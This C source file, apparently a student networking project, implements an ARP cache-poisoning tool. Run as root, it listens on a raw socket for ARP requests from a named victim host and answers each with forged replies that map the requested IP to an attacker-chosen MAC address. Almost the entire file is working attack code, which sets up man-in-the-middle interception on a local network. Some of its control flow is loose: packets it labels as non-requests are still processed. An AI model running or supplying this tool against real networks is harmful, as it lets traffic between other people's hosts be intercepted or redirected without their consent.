#include <sys/socket.h> //socket
#include <linux/if_ether.h> //ETH_P_ARP
#include <errno.h> //errno
#include <stdlib.h> //exit
#include <stdio.h> //printf
#include <arpa/inet.h> //htons
#include <string.h> //strerror

#include "resources.h"
#include "libft.h"
#include "net.h"
#include <stdio.h>
#include "arguments.h"
#include "debug.h"
#include "color_output.h"
#define ROOT_USER 0

#define PAINT_GREEN(text) GREEN text RESET
#define PAINT_RED(text) RED text RESET

static int is_victim_arp(struct s_arp_packet *arp_packet)
{
    return macs_equal(arp_packet->sender_hardware_addr, g_arguments.victim_mac) && (arp_packet->sender_protocol_addr == g_arguments.victim_in_addr.s_addr);
};

static void send_arp_reply(void)
{
    struct s_arp_packet arp_packet;
    arp_packet.hardware_type = htons(ARPHRD_ETHER);
    arp_packet.protocol_type = htons(IPV4_PROTO);
    arp_packet.hardware_addr_len = MAC_ADDR_BYTE_LEN;
    arp_packet.protocol_addr_len = IPV4_ADDR_BYTE_LEN;
    arp_packet.operation = htons(ARP_OPERATION_REPLY);
    

    ft_memcpy(arp_packet.sender_hardware_addr, g_arguments.spoofed_mac, MAC_ADDR_BYTE_LEN);
    arp_packet.sender_protocol_addr = g_arguments.requested_in_addr.s_addr;
    
    ft_memcpy(arp_packet.target_hardware_addr, g_arguments.victim_mac, MAC_ADDR_BYTE_LEN);
    arp_packet.target_protocol_addr = g_arguments.victim_in_addr.s_addr;
    
    struct sockaddr_ll sockaddr_ll;
    sockaddr_ll.sll_family = AF_PACKET;                                            /* Always AF_PACKET */ 
    sockaddr_ll.sll_protocol = htons(ETH_P_ARP);                                   /* Physical-layer protocol */
    sockaddr_ll.sll_ifindex = if_nametoindex(g_arguments.interface);               /* Interface number */
    sockaddr_ll.sll_hatype = 0;                                                    /* ARP hardware type */
    sockaddr_ll.sll_pkttype = 0;                                                   /* Packet type */
    sockaddr_ll.sll_halen = MAC_ADDR_BYTE_LEN;                                     /* Size of address */
    ft_memcpy(sockaddr_ll.sll_addr, g_arguments.victim_mac, MAC_ADDR_BYTE_LEN);    /* Physical-layer address */
    
    int i = 0;
    while(i < 5) {
        if (sendto(g_resources.socket, &arp_packet, sizeof(arp_packet), 0, (struct sockaddr *)&sockaddr_ll, sizeof(sockaddr_ll)) == -1)
        clean_exit_failure(RED"Failed to send an ARP reply"COLOR_RESET);
        i++;
    }
}

int main(int ac, char **av)
{
    if (getuid() != ROOT_USER)
        clean_exit_failure(RED"Error: Application may by run by root user only\n"COLOR_RESET);
    else
        printf(GREEN"Application is started by root user, continue execution\n"COLOR_RESET);
 
    parse_args(ac, av);
    get_local_mac_and_ip();
    print_local_mac_and_ip();
    
    g_resources.socket = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
    if (g_resources.socket == -1)
    {
        clean_exit_failure("Error when opening the socket");
    }
    DEBUG_LOG("Opened socket: %d\n", g_resources.socket);
    
    struct s_arp_packet arp_packet;
    while (1)
    {
        ft_bzero(&arp_packet, sizeof(struct s_arp_packet));
        printf(GREEN"Waiting for ARP requests from victim ip: %s, mac %s, intereseted in mac of ip %s\n"COLOR_RESET, g_arguments.victim_str_ip, g_arguments.victim_mac_str, g_arguments.requested_str_ip);
        char buffer[28];
        int result = recvfrom(g_resources.socket, &buffer, sizeof(buffer), 0, NULL, NULL);
        if (result != -1)
        {
            ft_bzero(&arp_packet, sizeof(struct s_arp_packet));
            ft_memcpy(&arp_packet, buffer, sizeof(struct s_arp_packet));
            DEBUG_LOG("Received a packet. %d bytes\n", result);
            if (IS_DEBUG_MODE)
                print_arp_packet(&arp_packet);
            
            printf(GREEN"-- Received ARP packet ---\n"COLOR_RESET);

            if (is_arp_request(&arp_packet))
                printf(GREEN"* ARP operation is a request, continue..\n"COLOR_RESET);
            else
                printf(RED"* ARP operation is not a request, stop packet analyses\n"COLOR_RESET);
            
            if (is_victim_arp(&arp_packet))
            {
                printf(GREEN"* APR request is from the victim host\n"COLOR_RESET);
                printf(GREEN"-- Now sending an ARP reply to the victim with spoofed mac %s, please wait... ---\n"COLOR_RESET, g_arguments.spoofed_mac_str);
                send_arp_reply();
                printf(GREEN"ARP reply was sent successfully. Run \n"COLOR_RESET);
            }
            else
            {
                printf(RED"* ARP request is not from victim host:\n");
                printf("-- mac: ");
                print_mac(arp_packet.sender_hardware_addr);
                printf("\n");
                char ipv4_str[INET_ADDRSTRLEN];
                ipv4_net_to_str((struct in_addr*)&arp_packet.sender_protocol_addr, ipv4_str);
                printf("-- ip: %s\n"COLOR_RESET, ipv4_str);
            }
        }
        else
            clean_exit_failure("Failed to receive a packet");
        
    }
    free_resources();
    return EXIT_SUCCESS;
}